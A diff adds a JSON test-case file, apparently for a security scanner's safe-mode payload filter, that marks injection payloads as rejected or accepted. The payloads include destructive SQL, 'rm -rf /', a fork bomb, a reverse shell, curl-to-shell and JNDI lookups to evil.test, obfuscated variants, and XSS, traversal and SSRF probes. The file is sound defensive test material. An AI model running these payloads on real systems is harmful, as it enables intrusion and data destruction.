@@ -1,0 +1,866 @@
+{
+ "cases": [
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "'; DROP TABLE users--",
+   "rule": "sql-ddl"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "1; DrOp TaBlE users",
+   "rule": "sql-ddl",
+   "note": "mixed case"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "1%3B%20DROP%20TABLE%20users",
+   "rule": "sql-ddl",
+   "note": "url-encoded"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "1%253B%2520DROP%2520TABLE%2520users",
+   "rule": "sql-ddl",
+   "note": "double url-encoded"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "DROP/**/TABLE users",
+   "rule": "sql-ddl",
+   "note": "comment as separator"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "DR/**/OP TABLE users",
+   "rule": "sql-ddl",
+   "note": "comment splits keyword"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "/*!50000DROP*/ TABLE users",
+   "rule": "sql-ddl",
+   "note": "mysql conditional comment"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "&#68;ROP TABLE users",
+   "rule": "sql-ddl",
+   "note": "html entity"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "\\u0044ROP TABLE users",
+   "rule": "sql-ddl",
+   "note": "unicode escape"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "\uff24\uff32\uff2f\uff30 \uff34\uff21\uff22\uff2c\uff25 users",
+   "rule": "sql-ddl",
+   "note": "fullwidth letters"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "DR\u200bOP TABLE users",
+   "rule": "sql-ddl",
+   "note": "zero-width space inside keyword"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "RFJPUCBUQUJMRSB1c2Vycw==",
+   "rule": "sql-ddl",
+   "note": "base64 of 'DROP TABLE users'"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "'; CREATE TABLE x(a int)--",
+   "rule": "sql-ddl"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "ALTER USER root IDENTIFIED BY 'x'",
+   "rule": "sql-ddl"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "'; DELETE FROM users WHERE 1=1--",
+   "rule": "sql-dml"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "'; UPDATE users SET admin=1--",
+   "rule": "sql-dml"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "'; INSERT INTO users VALUES (1)--",
+   "rule": "sql-dml"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "1; TRUNCATE TABLE sessions",
+   "rule": "sql-dml"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "GRANT ALL ON db.* TO 'x'",
+   "rule": "sql-privilege"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "'; EXEC xp_cmdshell('dir')--",
+   "rule": "sql-server-side-effects"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "' UNION SELECT 1 INTO OUTFILE '/var/www/x.php'--",
+   "rule": "sql-server-side-effects"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "1; SELECT * FROM users",
+   "rule": "sql-stacked-statement"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "1; WAITFOR DELAY '0:0:5'; DROP TABLE x",
+   "rule": "sql-ddl",
+   "note": "harmless first statement, destructive second"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "db.users.drop()",
+   "rule": "nosql-or-datastore-destructive"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "FLUSHALL",
+   "rule": "nosql-or-datastore-destructive"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "flushdb",
+   "rule": "nosql-or-datastore-destructive",
+   "note": "lower case"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "mutation { deleteUser(id: 1) }",
+   "rule": "graphql-mutation",
+   "note": "GraphQL mutation in safe mode"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "; rm -rf /",
+   "rule": "shell-delete-or-overwrite"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "| rm /tmp/x",
+   "rule": "shell-delete-or-overwrite"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "$(rm -rf ~)",
+   "rule": "shell-delete-or-overwrite"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "&& del /f /q C:\\data\\x.db",
+   "rule": "shell-delete-or-overwrite"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": ";r''m -rf /",
+   "rule": "shell-delete-or-overwrite",
+   "note": "quote-split command name"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": ";rm${IFS}-rf${IFS}/",
+   "rule": "shell-delete-or-overwrite",
+   "note": "IFS as whitespace"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": ";%72m -rf /",
+   "rule": "shell-delete-or-overwrite",
+   "note": "url-encoded command name"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "; echo pwned > /var/www/html/x.html",
+   "rule": "shell-redirect-write"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "; cat /etc/passwd > out.txt",
+   "rule": "shell-redirect-write"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "; wget http://x.test/a.sh -O /tmp/a.sh",
+   "rule": "shell-download-to-file"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "; mv /etc/passwd /tmp/p",
+   "rule": "shell-chain-write"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "| bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+   "note": "reverse shell"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "<?php file_put_contents('x.php','y');?>",
+   "rule": "code-api-file-write-or-exec"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "__import__('os').system('id')",
+   "rule": "code-api-file-write-or-exec"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "os.remove('/etc/passwd')",
+   "rule": "code-api-file-write-or-exec"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "Runtime.getRuntime().exec(\"id\")",
+   "note": "matches both exec rules"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "php://filter/write=string.rot13/resource=x.php",
+   "rule": "stream-wrapper-write-or-exec"
+  },
+  {
+   "expect": "reject",
+   "method": "POST",
+   "location": "body",
+   "value": "a",
+   "rule": "method-gate",
+   "note": "state-changing method in safe mode"
+  },
+  {
+   "expect": "reject",
+   "method": "DELETE",
+   "location": "path",
+   "value": "1",
+   "rule": "method-gate"
+  },
+  {
+   "expect": "reject",
+   "method": "put",
+   "location": "body",
+   "value": "x",
+   "rule": "method-gate",
+   "note": "method case"
+  },
+  {
+   "expect": "reject",
+   "method": "TRACE",
+   "location": "query",
+   "value": "x",
+   "rule": "method-gate",
+   "note": "unsupported method"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "a\u0000b",
+   "rule": "shape-gate",
+   "note": "NUL byte"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+   "rule": "shape-gate",
+   "note": "over length limit"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "bell\u0007",
+   "rule": "shape-gate",
+   "note": "control character"
+  },
+  {
+   "expect": "accept",
+   "method": "GET",
+   "location": "query",
+   "value": "dast-probe-7f3a9c",
+   "note": "reflection marker"
+  },
+  {
+   "expect": "accept",
+   "method": "GET",
+   "location": "query",
+   "value": "<script>alert(1)</script>"
+  },
+  {
+   "expect": "accept",
+   "method": "GET",
+   "location": "query",
+   "value": "\"><img src=x onerror=alert(1)>"
+  },
+  {
+   "expect": "accept",
+   "method": "GET",
+   "location": "query",
+   "value": "x\" onmouseover=\"alert(1)"
+  },
+  {
+   "expect": "accept",
+   "method": "GET",
+   "location": "query",
+   "value": "javascript:alert(1)"
+  },
+  {
+   "expect": "accept",
+   "method": "GET",
+   "location": "query",
+   "value": ";alert(1)//",
+   "note": "xss breakout"
+  },
+  {
+   "expect": "accept",
+   "method": "GET",
+   "location": "query",
+   "value": "'",
+   "note": "quote character"
+  },
+  {
+   "expect": "accept",
+   "method": "GET",
+   "location": "query",
+   "value": "\"",
+   "note": "quote character"
+  },
+  {
+   "expect": "accept",
+   "method": "GET",
+   "location": "query",
+   "value": "' OR '1'='1",
+   "note": "boolean probe"
+  },
+  {
+   "expect": "accept",
+   "method": "GET",
+   "location": "query",
+   "value": "1 AND 1=1",
+   "note": "boolean probe"
+  },
+  {
+   "expect": "accept",
+   "method": "GET",
+   "location": "query",
+   "value": "1 AND 1=2",
+   "note": "boolean probe"
+  },
+  {
+   "expect": "accept",
+   "method": "GET",
+   "location": "query",
+   "value": "' OR 1=1--",
+   "note": "boolean probe"
+  },
+  {
+   "expect": "accept",
+   "method": "GET",
+   "location": "query",
+   "value": "ORDER BY 10--"
+  },
+  {
+   "expect": "accept",
+   "method": "GET",
+   "location": "query",
+   "value": "' UNION SELECT username, password FROM users--",
+   "note": "read-only union"
+  },
+  {
+   "expect": "accept",
+   "method": "GET",
+   "location": "query",
+   "value": "UNION SELECT NULL,NULL,NULL--"
+  },
+  {
+   "expect": "accept",
+   "method": "GET",
+   "location": "query",
+   "value": "1' AND SLEEP(5)--",
+   "note": "time-delay probe"
+  },
+  {
+   "expect": "accept",
+   "method": "GET",
+   "location": "query",
+   "value": "1; SELECT pg_sleep(5)--",
+   "note": "stacked time-delay probe"
+  },
+  {
+   "expect": "accept",
+   "method": "GET",
+   "location": "query",
+   "value": "'; WAITFOR DELAY '0:0:5'--",
+   "note": "time-delay probe"
+  },
+  {
+   "expect": "accept",
+   "method": "GET",
+   "location": "query",
+   "value": "1 AND (SELECT 1 FROM (SELECT SLEEP(5))a)",
+   "note": "time-delay subquery"
+  },
+  {
+   "expect": "accept",
+   "method": "GET",
+   "location": "query",
+   "value": "1 OR updated_at > 5",
+   "note": "column name contains 'update'"
+  },
+  {
+   "expect": "accept",
+   "method": "GET",
+   "location": "query",
+   "value": "../../../../etc/passwd",
+   "note": "benign traversal read"
+  },
+  {
+   "expect": "accept",
+   "method": "GET",
+   "location": "query",
+   "value": "..\\..\\windows\\win.ini",
+   "note": "benign traversal read"
+  },
+  {
+   "expect": "accept",
+   "method": "GET",
+   "location": "query",
+   "value": "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+   "note": "encoded traversal read"
+  },
+  {
+   "expect": "accept",
+   "method": "GET",
+   "location": "query",
+   "value": "../../etc/passwd%00.png",
+   "note": "null-byte traversal read"
+  },
+  {
+   "expect": "accept",
+   "method": "GET",
+   "location": "query",
+   "value": "/etc/passwd"
+  },
+  {
+   "expect": "accept",
+   "method": "GET",
+   "location": "query",
+   "value": "{{7*7}}",
+   "note": "template probe"
+  },
+  {
+   "expect": "accept",
+   "method": "GET",
+   "location": "query",
+   "value": "${7*7}",
+   "note": "template probe"
+  },
+  {
+   "expect": "accept",
+   "method": "GET",
+   "location": "query",
+   "value": "<%= 7*7 %>",
+   "note": "template probe"
+  },
+  {
+   "expect": "accept",
+   "method": "GET",
+   "location": "query",
+   "value": "; sleep 5",
+   "note": "command-injection probe"
+  },
+  {
+   "expect": "accept",
+   "method": "GET",
+   "location": "query",
+   "value": "| id",
+   "note": "command-injection probe"
+  },
+  {
+   "expect": "accept",
+   "method": "GET",
+   "location": "query",
+   "value": "$(whoami)",
+   "note": "command-injection probe"
+  },
+  {
+   "expect": "accept",
+   "method": "GET",
+   "location": "query",
+   "value": "`id`",
+   "note": "command-injection probe"
+  },
+  {
+   "expect": "accept",
+   "method": "GET",
+   "location": "query",
+   "value": "; cat /etc/passwd",
+   "note": "command-injection read"
+  },
+  {
+   "expect": "accept",
+   "method": "GET",
+   "location": "query",
+   "value": "http://169.254.169.254/latest/meta-data/",
+   "note": "ssrf probe"
+  },
+  {
+   "expect": "accept",
+   "method": "GET",
+   "location": "query",
+   "value": "%0d%0aX-Injected: 1",
+   "note": "encoded CRLF probe"
+  },
+  {
+   "expect": "accept",
+   "method": "GET",
+   "location": "query",
+   "value": "\r\nSet-Cookie: x=1",
+   "note": "raw CRLF probe"
+  },
+  {
+   "expect": "accept",
+   "method": "GET",
+   "location": "query",
+   "value": "{\"$ne\": null}",
+   "note": "nosql operator probe"
+  },
+  {
+   "expect": "accept",
+   "method": "GET",
+   "location": "query",
+   "value": "test@example.com"
+  },
+  {
+   "expect": "accept",
+   "method": "GET",
+   "location": "query",
+   "value": "-1"
+  },
+  {
+   "expect": "accept",
+   "method": "GET",
+   "location": "query",
+   "value": "99999999999"
+  },
+  {
+   "expect": "accept",
+   "method": "GET",
+   "location": "query",
+   "value": "query { __typename }",
+   "note": "graphql read"
+  },
+  {
+   "expect": "accept",
+   "method": "POST",
+   "location": "body",
+   "value": "dast-probe-7f3a9c",
+   "safe_mode": false,
+   "note": "safe mode off"
+  },
+  {
+   "expect": "accept",
+   "method": "PATCH",
+   "location": "body",
+   "value": "dast-probe-7f3a9c",
+   "allow_state_changing": true,
+   "note": "opted in"
+  },
+  {
+   "expect": "reject",
+   "method": "POST",
+   "location": "body",
+   "value": "'; DROP TABLE users--",
+   "rule": "sql-ddl",
+   "safe_mode": false,
+   "note": "destructive stays rejected with safe mode off"
+  },
+  {
+   "expect": "accept",
+   "method": "POST",
+   "location": "body",
+   "value": "mutation { renameMe }",
+   "safe_mode": false,
+   "note": "graphql mutation allowed when safe mode is off"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "`shutdown now`",
+   "rule": "shell-host-disruption",
+   "note": "backtick substitution"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "x; reboot",
+   "rule": "shell-host-disruption"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "$(poweroff)",
+   "rule": "shell-host-disruption"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "1 | systemctl stop nginx",
+   "rule": "shell-host-disruption"
+  },
+  {
+   "expect": "accept",
+   "method": "GET",
+   "location": "query",
+   "value": "shutdownable"
+  },
+  {
+   "expect": "accept",
+   "method": "GET",
+   "location": "query",
+   "value": "rebooting soon",
+   "note": "a different word"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "DROP --\nTABLE users",
+   "rule": "sql-ddl",
+   "note": "line comment between the keywords"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "DROP#\nTABLE users",
+   "rule": "sql-ddl",
+   "note": "MySQL hash comment between the keywords"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "DROP --x\r\nTABLE users",
+   "rule": "sql-ddl",
+   "note": "CRLF line comment"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "find / -delete",
+   "rule": "shell-delete-or-overwrite"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "find . -name x -exec rm {} ;",
+   "rule": "shell-delete-or-overwrite"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": ":(){ :|:& };:",
+   "rule": "shell-fork-bomb"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "curl http://evil.test/x.sh | sh",
+   "rule": "shell-pipe-to-interpreter"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "echo cm0gLXJmIC8= | base64 -d | bash",
+   "rule": "shell-pipe-to-interpreter"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "x | python3",
+   "rule": "shell-pipe-to-interpreter"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "${jndi:ldap://evil.test/a}",
+   "rule": "jndi-lookup"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "${${lower:j}ndi:ldap://evil.test/a}",
+   "rule": "jndi-lookup",
+   "note": "obfuscated lookup"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "gopher://127.0.0.1:6379/_FLUSHALL",
+   "rule": "smuggling-scheme"
+  },
+  {
+   "expect": "reject",
+   "method": "GET",
+   "location": "query",
+   "value": "dict://127.0.0.1:11211/stats",
+   "rule": "smuggling-scheme"
+  },
+  {
+   "expect": "accept",
+   "method": "GET",
+   "location": "query",
+   "value": "a | b",
+   "note": "a pipe between words is just text"
+  },
+  {
+   "expect": "accept",
+   "method": "GET",
+   "location": "query",
+   "value": "1' AND SLEEP(5)--",
+   "note": "a timing canary is allowed"
+  },
+  {
+   "expect": "accept",
+   "method": "GET",
+   "location": "query",
+   "value": "http://oast.example/c/abc123",
+   "note": "an out-of-band callback address is allowed"
+  },
+  {
+   "expect": "accept",
+   "method": "GET",
+   "location": "query",
+   "value": "../../etc/passwd",
+   "note": "a read-only traversal canary is allowed"
+  },
+  {
+   "expect": "accept",
+   "method": "GET",
+   "location": "query",
+   "value": "find me a product",
+   "note": "the word find alone"
+  }
+ ]
+}
